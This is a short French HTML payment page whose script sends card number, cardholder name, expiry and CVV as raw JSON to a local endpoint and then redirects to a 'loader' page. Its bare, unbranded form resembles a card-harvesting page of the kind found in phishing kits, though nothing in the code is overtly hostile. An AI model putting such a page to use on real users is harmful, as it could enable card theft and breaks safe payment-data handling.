<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Paiement</title>
</head>
<body>
<h1>Paiement</h1>
<form id="paymentForm">
  <input type="text" name="cardNumber" placeholder="NumÃ©ro de carte" required><br>
  <input type="text" name="nomTitulaire" placeholder="Nom titulaire" required><br>
  <input type="text" name="expiry" placeholder="MM/AA" required><br>
  <input type="text" name="cvv" placeholder="CVV" required><br>
  <button type="submit">Payer</button>
</form>

<script src="redirect.js"></script>
<script>
document.getElementById('paymentForm').addEventListener('submit', function(e){
    e.preventDefault();
    const form = e.target;
    const data = {
        cardNumber: form.cardNumber.value,
        nomTitulaire: form.nomTitulaire.value,
        expiry: form.expiry.value,
        cvv: form.cvv.value
    };
    fetch('/api/payment',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify(data)
    }).then(res=>res.json()).then(()=>window.location.href='/loader.html');
});
</script>
</body>
</html>
